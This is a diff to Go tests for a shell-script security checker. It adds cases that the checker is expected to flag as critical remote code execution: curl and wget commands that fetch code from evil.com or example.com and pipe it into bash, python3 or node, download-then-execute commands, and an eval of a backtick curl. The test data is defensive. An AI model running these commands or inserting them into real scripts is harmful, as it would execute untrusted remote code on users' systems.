@@ -12,21 +12,40 @@ import (
 func TestScriptChecker_RemoteExecution(t *testing.T) {
 	t.Parallel()
 
-	sc := newSingleScriptContext("curl -sSL https://example.com/install.sh | bash")
-	checker := NewScriptChecker()
-	findings, err := checker.Check(t.Context(), sc)
-	if err != nil {
-		t.Fatal(err)
+	tests := []struct {
+		name   string
+		script string
+	}{
+		{"curl_bash", "curl -sSL https://example.com/install.sh | bash"},
+		{"curl_python3", "curl https://example.com/x.py | python3"},
+		{"wget_node", "wget http://evil.com/x | node"},
+		{"download_exec", "curl -o /tmp/payload http://evil.com/x; bash /tmp/payload"},
+		{"download_exec_ampersand", "curl -o /tmp/payload http://evil.com/x && bash /tmp/payload"},
+		{"process_substitution", "bash <(curl https://evil.com/install)"},
+		{"wget_output_document", "wget --output-document=/tmp/payload http://evil.com/x; chmod +x /tmp/payload"},
 	}
 
-	hasCritical := false
-	for _, f := range findings {
-		if f.Severity == SeverityCritical && f.Title == "Script downloads and executes remote code" {
-			hasCritical = true
-		}
-	}
-	if !hasCritical {
-		t.Error("expected Critical finding for curl|bash pattern")
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+
+			sc := newSingleScriptContext(tt.script)
+			checker := NewScriptChecker()
+			findings, err := checker.Check(t.Context(), sc)
+			if err != nil {
+				t.Fatal(err)
+			}
+
+			hasCritical := false
+			for _, f := range findings {
+				if f.Severity == SeverityCritical && f.Title == "Script downloads and executes remote code" {
+					hasCritical = true
+				}
+			}
+			if !hasCritical {
+				t.Errorf("expected Critical finding for %q", tt.name)
+			}
+		})
 	}
 }
 
@@ -110,6 +129,7 @@ func TestScriptChecker_Obfuscation(t *testing.T) {
 	}{
 		{"base64_decode", "echo data | base64 -d", true},
 		{"eval_var", `eval "$CMD"`, true},
+		{"eval_backtick", "eval " + "`" + "curl http://evil.com/cmd" + "`", true},
 		{"base64_subshell", "$(echo test | base64)", true},
 		{"hex_sequences", `printf '\x48\x65\x6c\x6c\x6f'`, true},
 		{"clean_script", "echo hello world", false},
